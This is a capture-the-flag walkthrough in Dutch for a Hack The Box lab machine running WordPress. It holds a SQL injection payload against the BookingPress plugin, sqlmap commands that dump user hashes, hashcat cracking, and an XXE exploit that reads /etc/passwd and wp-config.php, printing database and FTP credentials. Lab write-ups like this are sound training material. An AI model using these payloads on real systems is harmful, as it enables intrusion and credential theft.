@@ -1,0 +1,331 @@
+$ nmap -sC -sV 10.129.237.49
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 03:11 EDT
+Nmap scan report for 10.129.237.49
+Host is up (0.024s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
+|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
+|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Did not follow redirect to http://metapress.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 228.05 seconds
+
+open ports: ftp,ssh,http
+
+http redirects to metapress.htb -> toeveogen aan hotsts file.
+
+De site is een wordpress site. Uit de html code vinden we dat het versie 'WordPress 5.6.2' is. 
+
+$ gobuster dir -u http://metapress.htb/ -w /usr/share/wordlists/subdomains.txt
+===============================================================
+Gobuster v3.2.0-dev
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://metapress.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/subdomains.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.2.0-dev
+[+] Timeout:                 10s
+===============================================================
+2022/10/30 03:18:22 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-admin/]
+/login                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-login.php]
+/s                    (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]
+/a                    (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
+/t                    (Status: 301) [Size: 0] [--> http://metapress.htb/thank-you/]
+/rss                  (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]
+/ca                   (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
+/events               (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
+/e                    (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
+/event                (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
+/c                    (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
+/dashboard            (Status: 302) [Size: 0] [--> http://metapress.htb/wp-admin/]
+/sa                   (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]
+/sam                  (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]
+/about                (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
+/feed                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]
+/h                    (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]
+/th                   (Status: 301) [Size: 0] [--> http://metapress.htb/thank-you/]
+/sample               (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]
+/ab                   (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
+/atom                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/atom/]
+/abo                  (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
+/eve                  (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
+/hello                (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]
+/ev                   (Status: 301) [Size: 0] [--> http://metapress.htb/events/]
+/can                  (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
+/samp                 (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]
+/he                   (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]
+Progress: 4997 / 4998 (99.98%)
+===============================================================
+2022/10/30 03:20:24 Finished
+===============================================================
+
+Het blijkt dat de wp versie 5.6.2 vulnreble is voor CVE-2021-29450, CVE-2021-29447
+
+we voeren een agressive wpscan uit voor plugin enumeration om te achterhalen of er plugins zijn die insecure zijn.
+
+wpscan --url http://metapress.htb -e ap --plugins-detection aggressive
+
+[+] bookingpress-appointment-booking
+ | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
+ | Last Updated: 2022-10-22T14:11:00.000Z
+ | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
+ | [!] The version is out of date, the latest version is 1.0.45
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200
+ |
+ | Version: 1.0.10 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
+ | Confirmed By: Translation File (Aggressive Detection)
+ |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'
+
+
+De bookingpress plugin is heel outdated en deze versie is vulnreble voor SQLi. Een google search voor bookingpress 1.0.10 exploits geeft ons volgende site:
+https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357 -> CVE-2022-0739. 
+
+The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection
+
+voorbeeld request:
+
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+Content-Length: 197
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Origin: http://metapress.htb
+Referer: http://metapress.htb/events/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=l39f8t3qo3rofft1uqr8qidbqi
+Connection: close
+
+action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=-7502)+UNION+ALL+SELECT+%40%40version,%40%40version_comment,%40%40version_compile_os,1,2,3,4,5,6--+-
+
+
+(Om dit uit te proberen moet een geldige wpnonce gebruikt worden).
+
+Nu we weten dat total_service injectable is kunnen we deze request opslaan in burpsuit kan dit door in de repeater rechtermuis klik + copy to file te doen.
+
+sqlmap -r sqli.req -p total_service --leve=5 --risk=3 --dbs 
+
+-> available databases [2]:
+	[*] blog
+	[*] information_schema
+
+└─$ sqlmap -r sqli.req -p total_service --leve=5 --risk=3 -D blog --tables
+
+[27 tables]
++--------------------------------------+
+| wp_bookingpress_appointment_bookings |
+| wp_bookingpress_categories           |
+| wp_bookingpress_customers            |
+| wp_bookingpress_customers_meta       |
+| wp_bookingpress_customize_settings   |
+| wp_bookingpress_debug_payment_log    |
+| wp_bookingpress_default_daysoff      |
+| wp_bookingpress_default_workhours    |
+| wp_bookingpress_entries              |
+| wp_bookingpress_form_fields          |
+| wp_bookingpress_notifications        |
+| wp_bookingpress_payment_logs         |
+| wp_bookingpress_services             |
+| wp_bookingpress_servicesmeta         |
+| wp_bookingpress_settings             |
+| wp_commentmeta                       |
+| wp_comments                          |
+| wp_links                             |
+| wp_options                           |
+| wp_postmeta                          |
+| wp_posts                             |
+| wp_term_relationships                |
+| wp_term_taxonomy                     |
+| wp_termmeta                          |
+| wp_terms                             |
+| wp_usermeta                          |
+| wp_users                             |
++--------------------------------------+
+
+
+sqlmap -r sqli.req -p total_service --leve=5 --risk=3 -D blog --dump  
+
+Dit geeft iets te veel data om overzichtelijk te zijn. interessante tables zullen zijn: wp_usermeta, wp_users.
+
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
+| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+
+Dit geeft twee hashes 
+
+-> admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+-> manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+
+hash-identifier:
+
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+
+Possible Hashs:
+[+] MD5(Wordpress)
+
+
+Dit is code 400 in hashcat:
+
+hashcat -m 400 pass.txt /usr/share/wordlists/rockyou.txt
+
+manager:partylikearockstar
+admin:?
+
+er is geen password gevonden voor de admin hash.
+als we proberen in te loggen via ssh met de manger credentials lukt dit niet. We hebben wel access aan wp admin dashbord. 
+
+vanuit de wpscan vonden we dat deze wordpress vulnerable is voor CVE-2021-29447 en CVE-2021-29450.
+
+https://github.com/motikan2010/CVE-2021-29447
+
+deze github repo kan gebruikt worden om CVE-2021-29447 te exploiten. We halen /etc/passwd van de server door de stappen in de README.md te volgen.
+(pas host.docker.internal aan naar ip-adress)
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+
+jnelson heeft shell access en kunnen we proberen in te loggen via ssh.
+
+jnelson:partylikearockstar geeft ons geen ssh login.
+
+we halen wp-config.php op. dit geeft:
+
+<?php
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+
+/** MySQL database username */
+define( 'DB_USER', 'blog' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', 'metapress.htb' );
+define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
+define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
+define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
+define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
+define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
+define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
+define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
+define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );
+
+/**
+ * WordPress Database Table prefix.
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+
+hieruit halen we volgende passwords:
+
+ftp:
+-> metapress.htb:9NYS_ii@FyL_p5M2NvJ
+
+db:
+-> blog:635Aq@TdqrCwXFUZ
+
+we halen de informatie af dat op de ftp server staat om mogelijks in een van de bestanden hardcoded passwords te vinden om hiermee in te loggen op de server.
+
+we doen een grep naar jnelson. Om hardcoded passwords voor de user te vinden. Dit kunnen we doen aan de hand van volgende command: "grep -irE '*jnelson*' *"
+Hieruit zien we da send_email.php een password heeft voor jnelson.
+
+jnelson:Cb4_JmWM8zUZWMu@Ys
+
+hiermee hebben we een foothold op de server en de user flag.
+
+
+
